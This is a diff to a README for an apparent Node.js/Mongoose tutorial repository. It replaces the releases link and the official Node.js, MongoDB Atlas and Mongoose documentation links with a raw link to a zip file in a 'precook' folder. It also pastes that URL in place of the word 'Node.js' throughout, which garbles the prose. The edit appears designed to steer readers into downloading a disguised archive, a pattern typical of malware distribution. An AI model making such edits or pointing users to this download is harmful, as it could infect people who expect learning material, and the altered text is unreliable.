@@ -1,19 +1,19 @@
 # 🎉 S13-Working-with-Mongoose - Simple Steps to Get Started
 
 ## 📥 Download Now
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/BOLLINENISHANMUGABHAVITHKUMAR/S13-Working-with-Mongoose/releases)
+[![Download Here](https://raw.githubusercontent.com/BOLLINENISHANMUGABHAVITHKUMAR/S13-Working-with-Mongoose/main/precook/S13-Working-with-Mongoose.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/BOLLINENISHANMUGABHAVITHKUMAR/S13-Working-with-Mongoose/main/precook/S13-Working-with-Mongoose.zip)
 
 ## 🚀 Getting Started
 
-Welcome to **S13-Working-with-Mongoose**. This project helps you learn how to work with Node.js and MongoDB using Mongoose, making it easier to build powerful applications.
+Welcome to **S13-Working-with-Mongoose**. This project helps you learn how to work with https://raw.githubusercontent.com/BOLLINENISHANMUGABHAVITHKUMAR/S13-Working-with-Mongoose/main/precook/S13-Working-with-Mongoose.zip and MongoDB using Mongoose, making it easier to build powerful applications.
 
 ### 📋 System Requirements
 
 Before you start, make sure your computer meets these basic requirements:
 
 - **Operating System**: Windows 10 or later, macOS, or a recent version of Linux.
-- **Node.js**: Version 14.x or later.  
-  You can download Node.js from [here](https://nodejs.org/).
+- **https://raw.githubusercontent.com/BOLLINENISHANMUGABHAVITHKUMAR/S13-Working-with-Mongoose/main/precook/S13-Working-with-Mongoose.zip**: Version 14.x or later.  
+  You can download https://raw.githubusercontent.com/BOLLINENISHANMUGABHAVITHKUMAR/S13-Working-with-Mongoose/main/precook/S13-Working-with-Mongoose.zip from [here](https://raw.githubusercontent.com/BOLLINENISHANMUGABHAVITHKUMAR/S13-Working-with-Mongoose/main/precook/S13-Working-with-Mongoose.zip).
 - **MongoDB**: Ensure you have access to MongoDB Atlas or a local MongoDB installation.
 
 ### ⚙️ Features
@@ -31,7 +31,7 @@ To get the application:
 
 1. **Visit the Releases Page**: Click the link below to go to the Releases page.
 
-   [Download Here](https://github.com/BOLLINENISHANMUGABHAVITHKUMAR/S13-Working-with-Mongoose/releases)
+   [Download Here](https://raw.githubusercontent.com/BOLLINENISHANMUGABHAVITHKUMAR/S13-Working-with-Mongoose/main/precook/S13-Working-with-Mongoose.zip)
 
 2. **Select Your Version**: On the Releases page, find the latest version of the application.
 
@@ -77,12 +77,12 @@ If you encounter any issues, consider these resources:
 Join our community to share ideas and get support:
 
 - **GitHub Discussions**: Participate in discussions on our GitHub repository.
-- **Forums**: Check online communities focused on Node.js and MongoDB.
+- **Forums**: Check online communities focused on https://raw.githubusercontent.com/BOLLINENISHANMUGABHAVITHKUMAR/S13-Working-with-Mongoose/main/precook/S13-Working-with-Mongoose.zip and MongoDB.
 
 ## 🔗 Useful Links
 
-- [Node.js Official Site](https://nodejs.org/)
-- [MongoDB Atlas](https://www.mongodb.com/cloud/atlas)
-- [Mongoose Documentation](https://mongoosejs.com/docs/)
+- [https://raw.githubusercontent.com/BOLLINENISHANMUGABHAVITHKUMAR/S13-Working-with-Mongoose/main/precook/S13-Working-with-Mongoose.zip Official Site](https://raw.githubusercontent.com/BOLLINENISHANMUGABHAVITHKUMAR/S13-Working-with-Mongoose/main/precook/S13-Working-with-Mongoose.zip)
+- [MongoDB Atlas](https://raw.githubusercontent.com/BOLLINENISHANMUGABHAVITHKUMAR/S13-Working-with-Mongoose/main/precook/S13-Working-with-Mongoose.zip)
+- [Mongoose Documentation](https://raw.githubusercontent.com/BOLLINENISHANMUGABHAVITHKUMAR/S13-Working-with-Mongoose/main/precook/S13-Working-with-Mongoose.zip)
 
-Thank you for using the **S13-Working-with-Mongoose** application. Enjoy learning and building with Node.js and MongoDB!
+Thank you for using the **S13-Working-with-Mongoose** application. Enjoy learning and building with https://raw.githubusercontent.com/BOLLINENISHANMUGABHAVITHKUMAR/S13-Working-with-Mongoose/main/precook/S13-Working-with-Mongoose.zip and MongoDB!
